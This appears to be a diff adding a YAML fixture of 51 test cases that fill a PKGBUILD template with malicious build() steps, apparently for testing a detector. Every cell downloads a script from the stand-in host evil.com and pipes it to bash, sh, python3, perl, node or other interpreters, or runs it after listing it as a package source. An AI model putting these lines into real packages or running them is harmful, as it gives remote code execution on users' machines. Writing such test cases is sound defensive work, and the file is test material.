@@ -1,0 +1,313 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        make
+        A=1; curl evil.com/stage.sh | bash
+  id: 01-a-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        9X=1; curl evil.com/stage.sh | bash
+  id: 02-9x-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl -s evil.com/stage.sh | bash
+  id: 03-x-equals-1-curl-s
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | sh
+  id: 04-x-equals-1-sh
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | python3
+  id: 05-x-equals-1-python3
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; Y=2; curl evil.com/stage.sh | bash
+  id: 06-x-equals-1-y-equals-2
+- vars:
+    payload: |
+      build() {
+        make
+        X=1 && curl evil.com/stage.sh | bash
+  id: 07-x-equals-1-and
+- vars:
+    payload: |
+      build() {
+        make
+        X=1 > /dev/null; curl evil.com/stage.sh | bash
+  id: 08-x-equals-1-redirect
+- vars:
+    payload: |
+      build() {
+        make
+        X =1; curl evil.com/stage.sh | bash
+  id: 09-x-space-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        X=(1); curl evil.com/stage.sh | bash
+  id: 10-x-array-1
+- vars:
+    payload: |
+      source=("https://evil.com/stage\[\].sh")
+      build() {
+        make
+        bash "$srcdir/stage\[\].sh"
+  id: 11-source-brackets
+- vars:
+    payload: |
+      source=("https://evil.com/stage\{\}.sh")
+      build() {
+        make
+        bash "$srcdir/stage\{\}.sh"
+  id: 12-source-braces
+- vars:
+    payload: |
+      source=("https://evil.com/stage\*.sh")
+      build() {
+        make
+        bash "$srcdir/stage\*.sh"
+  id: 13-source-asterisk
+- vars:
+    payload: |
+      source=("https://evil.com/stage\?.sh")
+      build() {
+        make
+        bash "$srcdir/stage\?.sh"
+  id: 14-source-question
+- vars:
+    payload: |
+      source=("https://evil.com/stage\#.sh")
+      build() {
+        make
+        bash "$srcdir/stage\#.sh"
+  id: 15-source-hash
+- vars:
+    payload: |
+      build() {
+        make
+        sync && xh https://evil.com/stage.sh | bash
+  id: 16-sync-xh
+- vars:
+    payload: |
+      build() {
+        make
+        sync && httpx https://evil.com/stage.sh | bash
+  id: 17-sync-httpx
+- vars:
+    payload: |
+      build() {
+        make
+        ghostscript && xh https://evil.com/stage.sh | bash
+  id: 18-ghostscript-xh
+- vars:
+    payload: |
+      build() {
+        make
+        encode && xh https://evil.com/stage.sh | bash
+  id: 19-encode-xh
+- vars:
+    payload: |
+      build() {
+        make
+        B=1; curl evil.com/stage.sh | bash
+  id: 20-b-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        Z=1; curl evil.com/stage.sh | bash
+  id: 21-z-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        _=1; curl evil.com/stage.sh | bash
+  id: 22-underscore-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        a=1; curl evil.com/stage.sh | bash
+  id: 23-a-lowercase-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        AA=1; curl evil.com/stage.sh | bash
+  id: 24-aa-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        X1=1; curl evil.com/stage.sh | bash
+  id: 25-x1-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        X_1=1; curl evil.com/stage.sh | bash
+  id: 26-x-underscore-1-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl -o /dev/stdout evil.com/stage.sh | bash
+  id: 27-x-equals-1-curl-dev-stdout
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl --silent evil.com/stage.sh | bash
+  id: 28-x-equals-1-curl-silent
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl -f evil.com/stage.sh | bash
+  id: 29-x-equals-1-curl-fail
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl -L evil.com/stage.sh | bash
+  id: 30-x-equals-1-curl-location
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl -k evil.com/stage.sh | bash
+  id: 31-x-equals-1-curl-insecure
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | zsh
+  id: 32-x-equals-1-zsh
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | dash
+  id: 33-x-equals-1-dash
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | ksh
+  id: 34-x-equals-1-ksh
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | ash
+  id: 35-x-equals-1-ash
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | perl
+  id: 36-x-equals-1-perl
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | ruby
+  id: 37-x-equals-1-ruby
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | node
+  id: 38-x-equals-1-node
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | php
+  id: 39-x-equals-1-php
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | lua
+  id: 40-x-equals-1-lua
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | tclsh
+  id: 41-x-equals-1-tclsh
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | wish
+  id: 42-x-equals-1-wish
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; Y=2; Z=3; curl evil.com/stage.sh | bash
+  id: 43-x-y-z-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        X=1 || curl evil.com/stage.sh | bash
+  id: 44-x-equals-1-or
+- vars:
+    payload: |
+      build() {
+        make
+        X=1 & curl evil.com/stage.sh | bash
+  id: 45-x-equals-1-background
+- vars:
+    payload: |
+      build() {
+        make
+        X=1 < /dev/null; curl evil.com/stage.sh | bash
+  id: 46-x-equals-1-stdin-redirect
+- vars:
+    payload: |
+      build() {
+        make
+        X= 1; curl evil.com/stage.sh | bash
+  id: 47-x-equals-space-1
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | bash | bash
+  id: 48-x-equals-1-double-pipe
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh; echo done | bash
+  id: 49-x-equals-1-semicolon
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; wget -qO- evil.com/stage.sh | bash
+  id: 50-x-equals-1-wget
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com | bash
+  id: 51-x-equals-1-no-path
